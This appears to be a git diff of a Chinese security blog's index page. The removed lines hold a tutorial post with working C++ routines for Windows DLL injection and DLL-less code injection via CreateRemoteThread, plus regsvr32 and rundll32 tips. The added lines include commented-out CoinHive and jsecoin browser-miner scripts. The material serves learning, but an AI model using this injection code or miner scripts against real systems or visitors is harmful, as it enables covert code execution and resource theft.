-<li>注册表 <a href="https://www.wikiwand.com/zh-hans/%E6%B3%A8%E5%86%8C%E8%A1%A8" target="_blank" rel="external">https://www.wikiwand.com/zh-hans/%E6%B3%A8%E5%86%8C%E8%A1%A8</a></li>
-</ul>
-
-          
+          前言&nbsp;&nbsp;&nbsp;&nbsp;注册表是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候，注册表就已经出现。随后推出的Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是，从W
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/24/windows注册表/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1478,7 +1766,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -1488,11 +1776,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-16T10:13:25+08:00">
+                2017-07-16
+              </time>
             
 
             
@@ -1501,6 +1799,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/windows安全/" itemprop="url" rel="index">
+                    <span itemprop="name">windows安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -1511,6 +1831,37 @@
 
           
 
+          
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
           
 
           
@@ -1527,17 +1878,16 @@
       
         
           
-            <h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><h4 id="DLL远程注入"><a href="#DLL远程注入" class="headerlink" title="DLL远程注入"></a>DLL远程注入</h4><p>dll的注入和卸载<br><img src="/2017/07/16/windows DLL注入/1.png" alt=""><br>关键性代码如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div></pre></td><td class="code"><pre><div class="line">VOID CInjectDllDlg::InjectDll(DWORD dwPid, char *szDllName)</div><div class="line">&#123;</div><div class="line">    if ( dwPid == 0 || lstrlen(szDllName) == 0 )</div><div class="line">    &#123;</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    char *pFunName = &quot;LoadLibraryA&quot;;</div><div class="line"></div><div class="line">    // 打开目标进程</div><div class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, </div><div class="line">                                  FALSE, dwPid);</div><div class="line"></div><div class="line">    if ( hProcess == NULL )</div><div class="line">    &#123;</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 计算欲注入DLL文件完整路径的长度</div><div class="line">    int nDllLen = lstrlen(szDllName) + sizeof(char);</div><div class="line"></div><div class="line">    // 在目标进程申请一块长度为nDllLen大小的内存空间</div><div class="line">    PVOID pDllAddr = VirtualAllocEx(hProcess,</div><div class="line">                                    NULL, nDllLen,</div><div class="line">                                    MEM_COMMIT,</div><div class="line">                                    PAGE_READWRITE);</div><div class="line"></div><div class="line">    if ( pDllAddr == NULL )</div><div class="line">    &#123;</div><div class="line">        CloseHandle(hProcess);</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    DWORD dwWriteNum = 0;</div><div class="line"></div><div class="line">    // 将欲注入DLL文件的完整路径写入在目标进程中申请的空间内</div><div class="line">    WriteProcessMemory(hProcess, pDllAddr, szDllName, </div><div class="line">                       nDllLen, &amp;dwWriteNum);</div><div class="line"></div><div class="line">    // 获得LoadLibraryA()函数的地址</div><div class="line">    FARPROC pFunAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;),</div><div class="line">                                      pFunName);</div><div class="line"></div><div class="line">    // 创建远程线程</div><div class="line">    HANDLE hThread = CreateRemoteThread(hProcess,</div><div class="line">                         NULL, 0,</div><div class="line">                         (LPTHREAD_START_ROUTINE)pFunAddr,</div><div class="line">                         pDllAddr, 0, NULL);</div><div class="line">    WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">    CloseHandle(hThread);</div><div class="line">    CloseHandle(hProcess);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void CInjectDllDlg::OnBtnUninject() </div><div class="line">&#123;</div><div class="line">    // TODO: Add your control notification handler code here</div><div class="line">    char szDllName[MAX_PATH] = &#123; 0 &#125;;</div><div class="line">    char szProcessName[MAXBYTE] = &#123; 0 &#125;;</div><div class="line">    DWORD dwPid = 0;</div><div class="line">    </div><div class="line">    GetDlgItemText(IDC_EDIT_DLLFILE, szDllName, MAX_PATH);</div><div class="line">    GetDlgItemText(IDC_EDIT_PROCESSNAME, szProcessName, MAXBYTE);</div><div class="line">    </div><div class="line">    // 由进程名获得PID</div><div class="line">    dwPid = GetProcId(szProcessName);</div><div class="line">    </div><div class="line">    // 注入szDllName到dwPid</div><div class="line">    UnInjectDll(dwPid, szDllName);</div><div class="line">&#125;</div><div class="line"></div><div class="line">VOID CInjectDllDlg::UnInjectDll(DWORD dwPid, char *szDllName)</div><div class="line">&#123;</div><div class="line">    if ( dwPid == 0 || lstrlen(szDllName) == 0 )</div><div class="line">    &#123;</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    HANDLE hSnap = CreateToolhelp32Snapshot(</div><div class="line">                            TH32CS_SNAPMODULE, </div><div class="line">                            dwPid);</div><div class="line"></div><div class="line">    MODULEENTRY32 me32;</div><div class="line">    me32.dwSize = sizeof(me32);</div><div class="line"></div><div class="line">    // 查找匹配的进程名称</div><div class="line">    BOOL bRet = Module32First(hSnap, &amp;me32);</div><div class="line">    while ( bRet )</div><div class="line">    &#123;</div><div class="line">        if ( lstrcmp(strupr(me32.szExePath), </div><div class="line">                     strupr(szDllName)) == 0 )</div><div class="line">        &#123;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        bRet = Module32Next(hSnap, &amp;me32);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    CloseHandle(hSnap);</div><div class="line"></div><div class="line">    char *pFunName = &quot;FreeLibrary&quot;;</div><div class="line"></div><div class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, </div><div class="line">                                  FALSE, dwPid);</div><div class="line">    if ( hProcess == NULL )</div><div class="line">    &#123;</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    FARPROC pFunAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;),</div><div class="line">                                      pFunName);</div><div class="line"></div><div class="line">    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, </div><div class="line">                                        (LPTHREAD_START_ROUTINE)pFunAddr,</div><div class="line">                                        me32.hModule, 0, NULL);</div><div class="line">    WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">    CloseHandle(hThread);</div><div class="line">    CloseHandle(hProcess);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 整个注入与卸载的过程其实就是让远程线程执行一次LoadLibrary()函数或FreeLibrary()函数。</p>
-<h4 id="无DLL的代码注入"><a href="#无DLL的代码注入" class="headerlink" title="无DLL的代码注入"></a>无DLL的代码注入</h4><p>  <img src="/2017/07/16/windows DLL注入/2.png" alt=""><br>关键性代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line">typedef struct _DATA</div><div class="line">&#123;</div><div class="line">    DWORD dwLoadLibrary;</div><div class="line">    DWORD dwGetProcAddress;</div><div class="line">    DWORD dwGetModuleHandle;</div><div class="line">    DWORD dwGetModuleFileName;</div><div class="line"></div><div class="line">    char User32Dll[STRLEN];</div><div class="line">    char MessageBox[STRLEN];</div><div class="line">    char Str[STRLEN];</div><div class="line">&#125;DATA, *PDATA;</div><div class="line"></div><div class="line">DWORD WINAPI RemoteThreadProc(LPVOID lpParam)</div><div class="line">&#123;</div><div class="line">    PDATA pData = (PDATA)lpParam;</div><div class="line"></div><div class="line">    // 定义API函数原型</div><div class="line">    HMODULE (__stdcall *MyLoadLibrary)(LPCTSTR);</div><div class="line">    FARPROC (__stdcall *MyGetProcAddress)(HMODULE, LPCSTR);</div><div class="line">    HMODULE (__stdcall *MyGetModuleHandle)(LPCTSTR);</div><div class="line">    int (__stdcall *MyMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);</div><div class="line">    DWORD (__stdcall *MyGetModuleFileName)(HMODULE, LPTSTR, DWORD);</div><div class="line"></div><div class="line">    MyLoadLibrary = (HMODULE (__stdcall *)(LPCTSTR))</div><div class="line">                                            pData-&gt;dwLoadLibrary;</div><div class="line">    MyGetProcAddress = (FARPROC (__stdcall *)(HMODULE, LPCSTR))</div><div class="line">                                            pData-&gt;dwGetProcAddress;</div><div class="line">    MyGetModuleHandle = (HMODULE (__stdcall *)(LPCSTR))</div><div class="line">                                            pData-&gt;dwGetModuleHandle;</div><div class="line">    MyGetModuleFileName = (DWORD (__stdcall *)(HMODULE, LPTSTR, DWORD))</div><div class="line">                                            pData-&gt;dwGetModuleFileName;</div><div class="line"></div><div class="line">    HMODULE hModule = MyLoadLibrary(pData-&gt;User32Dll);</div><div class="line">    MyMessageBox = (int (__stdcall *)(HWND, LPCTSTR, LPCTSTR, UINT))</div><div class="line">                                  MyGetProcAddress(hModule, pData-&gt;MessageBox);</div><div class="line"></div><div class="line">    char szModuleFileName[MAX_PATH] = &#123; 0 &#125;;</div><div class="line">    MyGetModuleFileName(NULL, szModuleFileName, MAX_PATH);</div><div class="line"></div><div class="line">    MyMessageBox(NULL, pData-&gt;Str, szModuleFileName, MB_OK);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">VOID CNoDllInjectDlg::InjectCode(DWORD dwPid)</div><div class="line">&#123;</div><div class="line">    // 打开进程并获取进程句柄</div><div class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, </div><div class="line">                                  FALSE, dwPid);</div><div class="line"></div><div class="line">    if ( hProcess == NULL )</div><div class="line">    &#123;</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    DATA Data = &#123; 0 &#125;;</div><div class="line"></div><div class="line">    // 获取kernel32.dll中相关的导出函数</div><div class="line">    Data.dwLoadLibrary = (DWORD)GetProcAddress(</div><div class="line">                                    GetModuleHandle(&quot;kernel32.dll&quot;),</div><div class="line">                                    &quot;LoadLibraryA&quot;);</div><div class="line">    Data.dwGetProcAddress = (DWORD)GetProcAddress(</div><div class="line">                                    GetModuleHandle(&quot;kernel32.dll&quot;),</div><div class="line">                                    &quot;GetProcAddress&quot;);</div><div class="line">    Data.dwGetModuleHandle = (DWORD)GetProcAddress(</div><div class="line">                                    GetModuleHandle(&quot;kernel32.dll&quot;),</div><div class="line">                                    &quot;GetModuleHandleA&quot;);</div><div class="line">    Data.dwGetModuleFileName = (DWORD)GetProcAddress(</div><div class="line">                                    GetModuleHandle(&quot;kernel32.dll&quot;),</div><div class="line">                                    &quot;GetModuleFileNameA&quot;);</div><div class="line"></div><div class="line">    // 需要的其他DLL和导出函数</div><div class="line">    lstrcpy(Data.User32Dll, &quot;user32.dll&quot;);</div><div class="line">    lstrcpy(Data.MessageBox, &quot;MessageBoxA&quot;);</div><div class="line">    // MessageBoxA()弹出的字符串</div><div class="line">    lstrcpy(Data.Str, &quot;Inject Code !!!&quot;);</div><div class="line"></div><div class="line">    // 在目标进程申请空间</div><div class="line">    LPVOID lpData = VirtualAllocEx(hProcess, NULL, sizeof(Data),</div><div class="line">                                   MEM_COMMIT | MEM_RESERVE,</div><div class="line">                                   PAGE_READWRITE);</div><div class="line"></div><div class="line">    DWORD dwWriteNum = 0;</div><div class="line">    WriteProcessMemory(hProcess, lpData, &amp;Data, </div><div class="line">                       sizeof(Data), &amp;dwWriteNum);</div><div class="line"></div><div class="line">    // 在目标进程空间申请的用于保存代码的长度</div><div class="line">    DWORD dwFunSize = 0x1000;</div><div class="line">    LPVOID lpCode = VirtualAllocEx(hProcess, NULL, dwFunSize,</div><div class="line">                                   MEM_COMMIT, </div><div class="line">                                   PAGE_EXECUTE_READWRITE);</div><div class="line"></div><div class="line">    BOOL bRet = WriteProcessMemory(hProcess, lpCode, &amp;RemoteThreadProc, </div><div class="line">                       dwFunSize, &amp;dwWriteNum);</div><div class="line"></div><div class="line">    if ( bRet == FALSE )</div><div class="line">    &#123;</div><div class="line">        int n = GetLastError();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,</div><div class="line">                                        (LPTHREAD_START_ROUTINE)lpCode,</div><div class="line">                                        lpData, 0, NULL);</div><div class="line">    WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">    CloseHandle(hThread);</div><div class="line">    CloseHandle(hProcess);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>通过peid可以查看DLL的导出函数<br><img src="/2017/07/16/windows DLL注入/3.png" alt=""><br>还可以通过vc6自带的dependency Walker以及CFF Explorer<br><img src="/2017/07/16/windows DLL注入/4.png" alt=""><br><img src="/2017/07/16/windows DLL注入/5.png" alt=""></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;这种方式是直接把想要使用的API函数以及API函数所在的DLL文件都封装在一个结构体中，直接写入目标进程的空间中，最后调用CreateRemoteThread()函数即可将其运行。</p>
-<h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>通过windows自带工具运行DLL的两种方法<br>1.通过regsvr32.exe 调用  例如 regsvr32  /i  c:\test.dll<br>2.通过rundll32.exe 调用  例如 rundll32.exe  “c:\test.dll” ,RundllFunc FunParam<br>3.通过Dependency Walker工具查看应用程序所使用到的动态链接库文件,此外还可以使用dumpbin工具<br><img src="/2017/07/16/windows DLL注入/dependency.png" alt=""><br><img src="/2017/07/16/windows DLL注入/dumpbin.png" alt=""></p>
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="http://bbs.pediy.com/thread-66452.htm" target="_blank" rel="external">神奇的马甲Dll By 海风月影</a><br><a href="http://www.freebuf.com/articles/system/94693.html" target="_blank" rel="external">DLL注入的几种姿势（二）：CreateRemoteThread And More</a><br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf" target="_blank" rel="external">windows进程注入</a></p>
-
-          
+          概述DLL远程注入dll的注入和卸载关键性代码如下:
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/16/windows DLL注入/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1612,13 +1962,13 @@
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
-          
+           
         </div>
         <nav class="site-state motion-element">
 
           
             <div class="site-state-item site-state-posts">
-              <a href="/">
+              <a href="/archives">
                 <span class="site-state-item-count">45</span>
                 <span class="site-state-item-name">日志</span>
               </a>
@@ -1724,11 +2074,56 @@
   &copy; 
   <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
-    <i class="fa fa-"></i>
+    <i class="fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">M0rk</span>
 </div>
 
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+<br>
+
+<!--
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+-->
+
+<!--
+<script type="text/javascript">
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/39357/kevien.github.io/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
+</script>
+-->
+
+<!--
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('uTu9h9LT1kVUk4O1UxyZAhd8uvoLLip5', {throttle: 0.3});
+
+  // Only start on non-mobile devices and if not opted-out
+  // in the last 14400 seconds (4 hours):
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+  }
+</script>
+-->
+
+
+<!--<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="https://kevien.github.io/static/api/js/canvas-nest.min.js"></script>-->
+<script src="https://kevien.github.io/static/api/js/love.js"></script>
 
 
         
@@ -1762,6 +2157,8 @@
 
 
 
+  
+
 
 
 
@@ -1774,46 +2171,42 @@
 
 
   
-  <script type="text/javascript" src="//jquery/index.js?v=2.1.3"></script>
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
 
   
-  <script type="text/javascript" src="//fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
 
   
-  <script type="text/javascript" src="//jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
 
   
-  <script type="text/javascript" src="//velocity/velocity.min.js?v=1.2.1"></script>
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
 
   
-  <script type="text/javascript" src="//velocity/velocity.ui.min.js?v=1.2.1"></script>
-
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
 
   
-
-
-  <script type="text/javascript" src="//src/utils.js?v="></script>
-
-  <script type="text/javascript" src="//src/motion.js?v="></script>
-
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
 
 
   
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
   
-
-
-  <script type="text/javascript" src="//src/affix.js?v="></script>
-
-  <script type="text/javascript" src="//src/schemes/pisces.js?v="></script>
-
-
+  
 
   
 
   
 
 
-  <script type="text/javascript" src="//src/bootstrap.js?v="></script>
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
 
 
 
@@ -1872,6 +2265,300 @@
 
   
 
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
